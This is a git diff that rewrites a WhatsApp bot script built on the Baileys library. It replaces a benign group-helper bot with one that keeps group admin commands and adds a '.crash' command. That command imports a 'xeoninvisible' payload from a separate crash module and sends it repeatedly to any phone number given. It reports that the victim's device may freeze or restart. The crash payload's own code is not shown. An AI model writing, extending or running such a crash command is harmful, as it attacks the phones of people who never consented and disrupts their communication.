@@ -1,213 +1,280 @@
-/*
- * CODINGX INDONET - AI Personal Assistant v2.1 (Fix Pairing)
- * Features: Pairing/QR + Config + Welcome + GroupInfo
- * Author: CodingX Indonet
- */
-
-require('./config'); // Load Config
-const { 
-    default: makeWASocket, 
-    useMultiFileAuthState, 
-    DisconnectReason, 
-    fetchLatestBaileysVersion, 
-    makeCacheableSignalKeyStore, 
-    delay,
-    jidDecode
-} = require('@whiskeysockets/baileys');
-const pino = require('pino');
-const { Boom } = require('@hapi/boom');
-const fs = require('fs');
-const readline = require('readline');
+// index.js
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
 const qrcode = require('qrcode-terminal');
-const config = require('./config'); // Panggil config
+const pino = require('pino');
+const fs = require('fs');
+const path = require('path');
+const config = require('./config.js');
 
-// Interface Input
-const question = (text) => {
-    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
-    return new Promise((resolve) => { rl.question(text, (answer) => { rl.close(); resolve(answer); }); });
-};
+// Import crash function
+const { xeoninvisible } = require('./lib/crash.js');
+const { showMenu } = require('./handler/menu.js');
 
-async function startCodingX() {
-    const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
-    const { version } = await fetchLatestBaileysVersion();
+let sock = null;
+const isPairing = process.argv.includes('--pair');
+
+async function connectToWhatsApp() {
+  const { state, saveCreds } = await useMultiFileAuthState(config.sessionName);
+  
+  sock = makeWASocket({
+    auth: state,
+    printQRInTerminal: true,
+    logger: pino({ level: 'silent' }),
+    browser: Browsers.ubuntu('Chrome'),
     
-    console.log(`\n💼 ${config.botName} Started... v${version.join('.')}`);
+    // Pairing code options
+    generatePairingCode: isPairing,
+    phoneNumber: isPairing ? config.ownerNumber : undefined,
+    
+    // Connection settings
+    markOnlineOnConnect: true,
+    syncFullHistory: false
+  });
 
-    const sock = makeWASocket({
-        version,
-        logger: pino({ level: 'silent' }),
-        printQRInTerminal: false,
-        auth: {
-            creds: state.creds,
-            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
-        },
-        browser: ['CodingX Indonet', 'Chrome', '1.0.0'],
-        markOnlineOnConnect: true,
-        generateHighQualityLinkPreview: true,
-    });
-
-    // --- PAIRING / QR LOGIC ---
-    if (!sock.authState.creds.registered) {
-        console.log(`\n=== LOGIN: ${config.botName} ===`);
-        console.log("1. QR Code");
-        console.log("2. Pairing Code");
-        const selection = await question("Pilih metode (1/2): ");
-
-        if (selection === '2') {
-            let phoneNumber = await question("Masukkan Nomor HP (Wajib 628xxx): ");
-            phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
-            
-            // Masalah Tuan tadi ada disini, sudah saya hapus validasinya.
-            // Langsung eksekusi request code!
-            
-            setTimeout(async () => {
-                let code = await sock.requestPairingCode(phoneNumber);
-                code = code?.match(/.{1,4}/g)?.join("-") || code;
-                console.log(`\n💰 KODE PAIRING: \x1b[32m${code}\x1b[0m\n`);
-            }, 3000);
-        } else {
-            console.log("Scan QR Code di bawah...");
-        }
+  sock.ev.on('creds.update', saveCreds);
+  
+  sock.ev.on('connection.update', async (update) => {
+    const { connection, lastDisconnect, qr, pairingCode } = update;
+    
+    if (qr && !isPairing) {
+      console.log('Scan QR Code ini:');
+      qrcode.generate(qr, { small: true });
     }
-
-    sock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect, qr } = update;
-        if (qr) qrcode.generate(qr, { small: true });
-
-        if (connection === 'close') {
-            let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
-            if (reason === DisconnectReason.badSession) { console.log(`Bad Session.`); process.exit(); }
-            else if (reason === DisconnectReason.connectionClosed) { startCodingX(); }
-            else if (reason === DisconnectReason.connectionLost) { startCodingX(); }
-            else if (reason === DisconnectReason.restartRequired) { startCodingX(); }
-            else if (reason === DisconnectReason.timedOut) { startCodingX(); }
-            else { startCodingX(); }
-        } else if (connection === 'open') {
-            console.log(`✅ ${config.botName} Siap Melayani Tuan Besar!`);
-        }
-    });
-
-    sock.ev.on('creds.update', saveCreds);
-
-    // ============================================================
-    // 🔥 FITUR WELCOME & GOODBYE (Member Join/Leave)
-    // ============================================================
-    sock.ev.on('group-participants.update', async (anu) => {
-        try {
-            const metadata = await sock.groupMetadata(anu.id);
-            const participants = anu.participants;
-
-            for (let num of participants) {
-                let ppuser;
-                try { 
-                    ppuser = await sock.profilePictureUrl(num, 'image');
-                } catch { 
-                    ppuser = 'https://telegra.ph/file/0a0209da029671d24c038.jpg'; 
-                }
-
-                if (anu.action == 'add') {
-                    const welcomeText = `Halo @${num.split('@')[0]} 👋\n\nSelamat datang di grup *${metadata.subject}*!\n\nJangan lupa baca deskripsi grup ya. Semoga betah! 💼`;
-                    await sock.sendMessage(anu.id, { image: { url: ppuser }, caption: welcomeText, mentions: [num] });
-                } 
-                else if (anu.action == 'remove') {
-                    const goodbyeText = `Sayonara @${num.split('@')[0]} 👋\n\nTerima kasih sudah mampir di *${metadata.subject}*.`;
-                    await sock.sendMessage(anu.id, { text: goodbyeText, mentions: [num] });
-                }
-            }
-        } catch (err) {
-            console.log("Error di fitur Welcome:", err);
-        }
-    });
-
-    // ============================================================
-    // 📩 MESSAGE HANDLER
-    // ============================================================
-    sock.ev.on('messages.upsert', async ({ messages, type }) => {
-        try {
-            if (type !== 'notify') return;
-            const m = messages[0];
-            if (!m.message) return;
-
-            const messageType = Object.keys(m.message)[0];
-            const body = (messageType === 'conversation') ? m.message.conversation :
-                         (messageType === 'imageMessage') ? m.message.imageMessage.caption :
-                         (messageType === 'extendedTextMessage') ? m.message.extendedTextMessage.text : '';
-
-            const from = m.key.remoteJid;
-            const isGroup = from.endsWith('@g.us');
-            const prefix = '.';
-            const isCmd = body.startsWith(prefix);
-            const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
-            const args = body.trim().split(/ +/).slice(1);
-            const text = args.join(" ");
-
-            if (config.autoRead) await sock.readMessages([m.key]);
-
-            if (isCmd) {
-                switch (command) {
-                    case 'menu':
-                    case 'help':
-                        const menuText = `
-💼 *CODINGX DASHBOARD* 💼
-
-👋 Halo Tuan! Berikut fitur yang tersedia:
-
-*Group Menu:*
-• ${prefix}tagall (Tag semua member)
-• ${prefix}hidetag (Tag tersembunyi)
-• ${prefix}infogroup (Cek detail grup)
-
-*Bot Info:*
-• ${prefix}ping (Cek kecepatan)
-• ${prefix}owner (Kontak Tuan Besar)
-
-_Powered by CodingX Indonet_
-                        `;
-                        await sock.sendMessage(from, { image: { url: "https://telegra.ph/file/0a0209da029671d24c038.jpg" }, caption: menuText }, { quoted: m });
-                        break;
-
-                    case 'owner':
-                         const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + `FN:${config.ownerName}\n` + `TEL;type=CELL;type=VOICE;waid=${config.ownerNumber}:${config.ownerNumber}\n` + 'END:VCARD';
-                         await sock.sendMessage(from, { contacts: { displayName: config.ownerName, contacts: [{ vcard }] } }, { quoted: m });
-                         break;
-
-                    case 'infogrup':
-                    case 'groupinfo':
-                        if (!isGroup) return sock.sendMessage(from, { text: config.mess.groupOnly }, { quoted: m });
-                        const groupMetadata = await sock.groupMetadata(from);
-                        const groupOwner = groupMetadata.owner || m.sender;
-                        const participants = groupMetadata.participants;
-                        let infoText = `📊 *INFO GRUP CODINGX* 📊\n\n🏷️ *Nama:* ${groupMetadata.subject}\n🆔 *ID:* ${groupMetadata.id}\n👑 *Owner:* @${groupOwner.split('@')[0]}\n👥 *Member:* ${participants.length} Orang\n`;
-                        await sock.sendMessage(from, { image: { url: await sock.profilePictureUrl(from, 'image').catch(_ => 'https://telegra.ph/file/0a0209da029671d24c038.jpg') }, caption: infoText, mentions: [groupOwner] }, { quoted: m });
-                        break;
-
-                    case 'ping':
-                        await sock.sendMessage(from, { text: `Pong! ⚡` }, { quoted: m });
-                        break;
-
-                    case 'hidetag':
-                        if (!isGroup) return sock.sendMessage(from, { text: config.mess.groupOnly }, { quoted: m });
-                        const mems = await sock.groupMetadata(from);
-                        await sock.sendMessage(from, { text: text ? text : 'Hidetag!', mentions: mems.participants.map(a => a.id) });
-                        break;
-
-                    case 'tagall':
-                        if (!isGroup) return sock.sendMessage(from, { text: config.mess.groupOnly }, { quoted: m });
-                        const data = await sock.groupMetadata(from);
-                        let teks = `💼 *TAG ALL MEMBER* 💼\n\n${text ? 'Pesan: ' + text : ''}\n\n`;
-                        for (let mem of data.participants) { teks += `➡️ @${mem.id.split('@')[0]}\n`; }
-                        await sock.sendMessage(from, { text: teks, mentions: data.participants.map(a => a.id) }, { quoted: m });
-                        break;
-                }
-            } else {
-                if (body.toLowerCase() === 'halo') {
-                    await sock.sendMessage(from, { text: `Halo juga Tuan! Ketik .menu untuk melihat fitur.` }, { quoted: m });
-                }
-            }
-        } catch (error) {
-            console.log(error);
-        }
-    });
+    
+    if (pairingCode) {
+      console.log(`\n🔢 PAIRING CODE: ${pairingCode}`);
+      console.log(`📱 Masukin di WhatsApp: Settings → Linked Devices → Link a Device`);
+    }
+    
+    if (connection === 'open') {
+      console.log(`✅ ${config.botName} AKTIF!`);
+      console.log(`🤖 Owner: ${config.ownerName}`);
+      console.log(`🚀 Prefix: ${config.botPrefix}`);
+      
+      // Send welcome message to owner
+      await sock.sendMessage(`${config.ownerNumber}@s.whatsapp.net`, { 
+        text: `${config.messages.welcome}\n\nBot Name: ${config.botName}\nVersion: ${config.botVersion}\nPrefix: ${config.botPrefix}` 
+      });
+    }
+    
+    if (connection === 'close') {
+      const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
+      console.log(`⚠️ Connection closed, ${shouldReconnect ? 'reconnecting' : 'not reconnecting'}...`);
+      if (shouldReconnect) {
+        setTimeout(connectToWhatsApp, 5000);
+      }
+    }
+  });
+  
+  // Message handler
+  sock.ev.on('messages.upsert', async (m) => {
+    const msg = m.messages[0];
+    if (!msg.message || msg.key.fromMe) return;
+    
+    await handleMessage(msg);
+  });
+  
+  // Group events
+  sock.ev.on('group-participants.update', async (update) => {
+    const { id, participants, action } = update;
+    
+    if (action === 'add' && participants.includes(sock.user.id)) {
+      console.log(`📥 Bot added to group: ${id}`);
+      await sock.sendMessage(id, { text: `${config.messages.groupJoined}\n\nKetik ${config.botPrefix}menu untuk melihat fitur bot!` });
+    }
+    
+    if (action === 'remove' && participants.includes(sock.user.id)) {
+      console.log(`📤 Bot removed from group: ${id}`);
+    }
+  });
+  
+  return sock;
 }
 
-startCodingX();
+async function handleMessage(msg) {
+  try {
+    const text = msg.message.conversation || 
+                 msg.message.extendedTextMessage?.text || 
+                 msg.message.imageMessage?.caption || '';
+    const sender = msg.key.remoteJid;
+    const fromMe = msg.key.fromMe;
+    const isGroup = sender.endsWith('@g.us');
+    const pushname = msg.pushName || 'User';
+    
+    // Command prefix check
+    if (!text.startsWith(config.botPrefix)) return;
+    
+    const command = text.slice(config.botPrefix.length).trim().split(' ')[0].toLowerCase();
+    const args = text.slice(config.botPrefix.length + command.length).trim().split(' ');
+    
+    console.log(`📨 Command: ${command} | From: ${pushname} | Group: ${isGroup}`);
+    
+    // ==================== CRASH COMMANDS ====================
+    if (command === 'crash' && config.enableCrash) {
+      if (!args[0]) {
+        return sock.sendMessage(sender, { text: `Format: ${config.botPrefix}crash 628xxxxxxx` });
+      }
+      
+      const target = args[0].replace(/\D/g, '');
+      if (!target.startsWith('62')) {
+        return sock.sendMessage(sender, { text: 'Nomor harus diawali 62 (Indonesia)' });
+      }
+      
+      const targetJid = `${target}@s.whatsapp.net`;
+      
+      await sock.sendMessage(sender, { text: `💀 MENGIRIM CRASH KE ${target}...` });
+      
+      try {
+        // Kirim crash berkali-kali
+        for (let i = 0; i < config.crashRepeat; i++) {
+          await xeoninvisible(sock, targetJid);
+          console.log(`[${i+1}/${config.crashRepeat}] Crash sent to ${target}`);
+          await delay(1000);
+        }
+        
+        await sock.sendMessage(sender, { 
+          text: `${config.messages.crashSuccess}\n\nTarget: ${target}\nJumlah: ${config.crashRepeat}x\nStatus: Device mungkin freeze/restart!` 
+        });
+      } catch (error) {
+        console.error('Crash error:', error);
+        await sock.sendMessage(sender, { text: config.messages.crashFailed });
+      }
+    }
+    
+    // ==================== GROUP COMMANDS ====================
+    else if (command === 'menu') {
+      await showMenu(sock, sender, pushname);
+    }
+    
+    else if (command === 'kick' && isGroup) {
+      if (!msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
+        return sock.sendMessage(sender, { text: `Tag orang yang mau di kick!\nContoh: ${config.botPrefix}kick @orang` });
+      }
+      
+      const target = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
+      try {
+        await sock.groupParticipantsUpdate(sender, [target], 'remove');
+        await sock.sendMessage(sender, { text: `✅ Berhasil kick @${target.split('@')[0]}` });
+      } catch (error) {
+        await sock.sendMessage(sender, { text: '❌ Gagal kick, mungkin bot bukan admin atau target admin' });
+      }
+    }
+    
+    else if (command === 'add' && isGroup) {
+      const number = args[0]?.replace(/\D/g, '');
+      if (!number) {
+        return sock.sendMessage(sender, { text: `Format: ${config.botPrefix}add 628xxxxxxx` });
+      }
+      
+      try {
+        await sock.groupParticipantsUpdate(sender, [`${number}@s.whatsapp.net`], 'add');
+        await sock.sendMessage(sender, { text: `✅ Berhasil add ${number}` });
+      } catch (error) {
+        await sock.sendMessage(sender, { text: '❌ Gagal add member' });
+      }
+    }
+    
+    else if (command === 'promote' && isGroup) {
+      const target = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+      if (!target) {
+        return sock.sendMessage(sender, { text: `Tag orang yang mau di promote!\nContoh: ${config.botPrefix}promote @orang` });
+      }
+      
+      try {
+        await sock.groupParticipantsUpdate(sender, [target], 'promote');
+        await sock.sendMessage(sender, { text: `✅ Berhasil promote @${target.split('@')[0]} jadi admin` });
+      } catch (error) {
+        await sock.sendMessage(sender, { text: '❌ Gagal promote' });
+      }
+    }
+    
+    else if (command === 'demote' && isGroup) {
+      const target = msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
+      if (!target) {
+        return sock.sendMessage(sender, { text: `Tag admin yang mau di demote!\nContoh: ${config.botPrefix}demote @orang` });
+      }
+      
+      try {
+        await sock.groupParticipantsUpdate(sender, [target], 'demote');
+        await sock.sendMessage(sender, { text: `✅ Berhasil demote @${target.split('@')[0]}` });
+      } catch (error) {
+        await sock.sendMessage(sender, { text: '❌ Gagal demote' });
+      }
+    }
+    
+    else if (command === 'tagall' && isGroup) {
+      try {
+        const groupMetadata = await sock.groupMetadata(sender);
+        const participants = groupMetadata.participants;
+        
+        let mentionText = '';
+        participants.forEach(participant => {
+          mentionText += `@${participant.id.split('@')[0]} `;
+        });
+        
+        await sock.sendMessage(sender, { 
+          text: `👥 TAG ALL MEMBER:\n\n${mentionText}`,
+          mentions: participants.map(p => p.id)
+        });
+      } catch (error) {
+        await sock.sendMessage(sender, { text: '❌ Gagal tag all' });
+      }
+    }
+    
+    else if (command === 'linkgroup' && isGroup) {
+      try {
+        const code = await sock.groupInviteCode(sender);
+        const link = `https://chat.whatsapp.com/${code}`;
+        await sock.sendMessage(sender, { text: `🔗 Link Group:\n${link}` });
+      } catch (error) {
+        await sock.sendMessage(sender, { text: '❌ Gagal mendapatkan link group' });
+      }
+    }
+    
+    else if (command === 'infogrup' && isGroup) {
+      try {
+        const metadata = await sock.groupMetadata(sender);
+        const participants = metadata.participants;
+        const admins = participants.filter(p => p.admin).map(p => `@${p.id.split('@')[0]}`);
+        
+        const infoText = `
+📊 INFO GRUP:
+├─ Nama: ${metadata.subject}
+├─ ID: ${metadata.id}
+├─ Dibuat: ${new Date(metadata.creation * 1000).toLocaleDateString()}
+├─ Jumlah Member: ${participants.length}
+├─ Admin (${admins.length}):
+${admins.map(a => `│  └─ ${a}`).join('\n')}
+└─ Deskripsi: ${metadata.desc || 'Tidak ada'}
+        `;
+        
+        await sock.sendMessage(sender, { text: infoText });
+      } catch (error) {
+        await sock.sendMessage(sender, { text: '❌ Gagal mendapatkan info grup' });
+      }
+    }
+    
+    else if (command === 'ping') {
+      const start = Date.now();
+      await sock.sendMessage(sender, { text: '🏓 Pong!' });
+      const latency = Date.now() - start;
+      await sock.sendMessage(sender, { text: `⚡ Latency: ${latency}ms` });
+    }
+    
+    else if (command === 'owner') {
+      await sock.sendMessage(sender, { 
+        text: `👑 OWNER BOT:\n\nNama: ${config.ownerName}\nNomor: ${config.ownerNumber}\n\nHubungi owner untuk custom bot!` 
+      });
+    }
+    
+  } catch (error) {
+    console.error('Message handler error:', error);
+  }
+}
+
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// Start bot
+connectToWhatsApp();
